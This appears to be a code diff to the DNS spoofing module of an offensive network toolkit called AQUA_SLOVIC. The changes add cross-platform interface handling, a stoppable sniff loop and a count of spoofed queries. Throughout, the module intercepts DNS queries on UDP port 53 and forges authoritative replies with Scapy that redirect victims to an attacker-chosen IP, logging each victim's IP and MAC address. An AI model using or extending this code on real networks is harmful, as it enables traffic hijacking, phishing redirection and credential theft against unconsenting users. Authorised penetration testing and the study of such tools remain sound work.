@@ -1,17 +1,38 @@
 """
-AQUA_SLOVIC — DNS Spoofer Module
+AQUA_SLOVIC -- DNS Spoofer Module
 Intercept DNS queries and inject forged responses.
 """
 
 import threading
 import fnmatch
+import platform
 
 from colorama import Fore, Style
 
 from aquaslovic.core.utils import (
     print_info, print_success, print_error, print_warning,
-    print_table, is_root, require_root,
+    print_table, is_root, require_root, get_local_ip,
 )
+
+
+def _get_scapy_iface(iface_name=None):
+    """Resolve a working Scapy interface for the current platform."""
+    try:
+        from scapy.all import conf, get_working_ifaces
+        if iface_name and iface_name.lower() != "auto":
+            if platform.system().lower() == "windows":
+                for iface_obj in get_working_ifaces():
+                    name = getattr(iface_obj, "name", str(iface_obj))
+                    desc = getattr(iface_obj, "description", "")
+                    guid = getattr(iface_obj, "guid", "")
+                    if (iface_name.lower() in name.lower()
+                            or iface_name.lower() in desc.lower()
+                            or iface_name == guid):
+                        return iface_obj
+            return iface_name
+        return conf.iface
+    except Exception:
+        return None
 
 
 class DNSSpoofer:
@@ -30,8 +51,12 @@ class DNSSpoofer:
     def __init__(self):
         self.running = False
         self.spoof_thread = None
-        self.records = {}    # domain → IP mapping
+        self.stop_event = threading.Event()
+        self.records = {}    # domain -> IP mapping
         self.spoof_all = ""  # If set, redirect ALL queries to this IP
+        self.iface = None
+        self.local_ip = None
+        self.spoof_count = 0
 
     def add_record(self, domain, ip):
         """
@@ -73,7 +98,7 @@ class DNSSpoofer:
             rows = [[domain, ip] for domain, ip in sorted(self.records.items())]
             print_table(headers, rows)
 
-    def start(self):
+    def start(self, iface=None):
         """Start the DNS spoofer."""
         if not require_root():
             return
@@ -89,14 +114,23 @@ class DNSSpoofer:
             return
 
         try:
-            from scapy.all import DNS
+            from scapy.all import DNS, conf
+            if platform.system().lower() == "windows":
+                conf.use_pcap = True
         except ImportError:
             print_error("Scapy is required for DNS spoofing. Install: pip install scapy")
             return
 
+        self.iface = _get_scapy_iface(iface)
+        self.local_ip = get_local_ip()
         self.running = True
+        self.stop_event.clear()
+        self.spoof_count = 0
 
         print_success("DNS spoofer started.")
+        if self.iface:
+            iface_str = getattr(self.iface, "name", str(self.iface))
+            print_info(f"Interface: {Fore.WHITE}{iface_str}{Style.RESET_ALL}")
         if self.spoof_all:
             print_info(f"All DNS queries -> {Fore.RED}{self.spoof_all}{Style.RESET_ALL}")
         else:
@@ -115,59 +149,141 @@ class DNSSpoofer:
             return
 
         self.running = False
-        print_info("DNS spoofer stopped.")
+        self.stop_event.set()
+
+        # Wait for the sniff thread to finish (bounded by sniff timeout)
+        if self.spoof_thread and self.spoof_thread.is_alive():
+            self.spoof_thread.join(timeout=3)
+
+        print_success(
+            f"DNS spoofer stopped. ({self.spoof_count} queries spoofed)"
+        )
 
     def _spoof_loop(self):
-        """Intercept and spoof DNS queries using scapy."""
+        """Intercept and spoof DNS queries using scapy with timed-loop approach."""
         try:
             from scapy.all import (
                 sniff, IP, UDP, DNS, DNSQR, DNSRR,
-                send, conf,
+                Ether, sendp, send, conf,
             )
 
             def process_packet(packet):
                 if not self.running:
                     return
 
+                # Must be a DNS query (qr=0)
                 if not (packet.haslayer(DNS) and
                         packet.haslayer(DNSQR) and
-                        packet[DNS].qr == 0):  # Only queries (qr=0)
+                        packet[DNS].qr == 0):
+                    return
+
+                # Skip packets from our own IP to avoid loops
+                if packet.haslayer(IP) and packet[IP].src == self.local_ip:
                     return
 
                 qname = packet[DNSQR].qname.decode(errors="ignore").rstrip(".")
                 redirect_ip = self._match_domain(qname)
 
                 if redirect_ip:
+                    src_ip = packet[IP].src if packet.haslayer(IP) else "?"
+                    src_mac = packet[Ether].src if packet.haslayer(Ether) else "?"
+
                     print(
                         f"  {Fore.RED}[DNS SPOOF]{Style.RESET_ALL} "
                         f"{qname} -> {Fore.RED}{redirect_ip}{Style.RESET_ALL} "
-                        f"(from {packet[IP].src})"
+                        f"(from {src_ip}  MAC: {Fore.YELLOW}{src_mac}{Style.RESET_ALL})"
                     )
 
-                    # Forge DNS response
-                    spoofed = (
-                        IP(dst=packet[IP].src, src=packet[IP].dst) /
-                        UDP(dport=packet[UDP].sport, sport=53) /
-                        DNS(
-                            id=packet[DNS].id,
-                            qr=1,  # Response
-                            aa=1,  # Authoritative
-                            qd=packet[DNS].qd,
-                            an=DNSRR(
-                                rrname=packet[DNSQR].qname,
-                                ttl=300,
-                                rdata=redirect_ip,
-                            ),
-                        )
-                    )
-                    send(spoofed, verbose=False)
+                    # Build spoofed DNS response
+                    try:
+                        if packet.haslayer(Ether):
+                            # Full L2 response (most reliable, especially on Windows)
+                            spoofed = (
+                                Ether(
+                                    dst=packet[Ether].src,
+                                    src=packet[Ether].dst,
+                                ) /
+                                IP(
+                                    dst=packet[IP].src,
+                                    src=packet[IP].dst,
+                                ) /
+                                UDP(
+                                    dport=packet[UDP].sport,
+                                    sport=53,
+                                ) /
+                                DNS(
+                                    id=packet[DNS].id,
+                                    qr=1,       # Response
+                                    aa=1,       # Authoritative
+                                    rd=packet[DNS].rd,  # Copy recursion desired
+                                    ra=1,       # Recursion available
+                                    qdcount=1,
+                                    ancount=1,
+                                    qd=packet[DNS].qd,
+                                    an=DNSRR(
+                                        rrname=packet[DNSQR].qname,
+                                        type="A",
+                                        ttl=300,
+                                        rdata=redirect_ip,
+                                    ),
+                                )
+                            )
+                            sendp(spoofed, verbose=False, iface=self.iface)
+                        else:
+                            # Fallback: L3 response
+                            spoofed = (
+                                IP(
+                                    dst=packet[IP].src,
+                                    src=packet[IP].dst,
+                                ) /
+                                UDP(
+                                    dport=packet[UDP].sport,
+                                    sport=53,
+                                ) /
+                                DNS(
+                                    id=packet[DNS].id,
+                                    qr=1,
+                                    aa=1,
+                                    rd=packet[DNS].rd,
+                                    ra=1,
+                                    qdcount=1,
+                                    ancount=1,
+                                    qd=packet[DNS].qd,
+                                    an=DNSRR(
+                                        rrname=packet[DNSQR].qname,
+                                        type="A",
+                                        ttl=300,
+                                        rdata=redirect_ip,
+                                    ),
+                                )
+                            )
+                            send(spoofed, verbose=False)
 
-            sniff(
-                filter="udp port 53",
-                prn=process_packet,
-                store=False,
-                stop_filter=lambda p: not self.running,
-            )
+                        self.spoof_count += 1
+
+                    except Exception as e:
+                        print_error(f"Failed to send spoofed reply: {e}")
+
+            # Use a timed-loop approach: sniff with a short timeout so we can
+            # check the stop event regularly instead of blocking forever.
+            while self.running and not self.stop_event.is_set():
+                try:
+                    sniff(
+                        filter="udp port 53",
+                        prn=process_packet,
+                        store=False,
+                        timeout=1,       # Check stop_event every 1 second
+                        iface=self.iface,
+                    )
+                except PermissionError:
+                    print_error("Permission denied -- run as Administrator/root.")
+                    self.running = False
+                    break
+                except Exception as e:
+                    if self.running:
+                        # Brief errors can happen between sniff cycles; don't
+                        # crash out unless they persist.
+                        pass
 
         except Exception as e:
             if self.running:
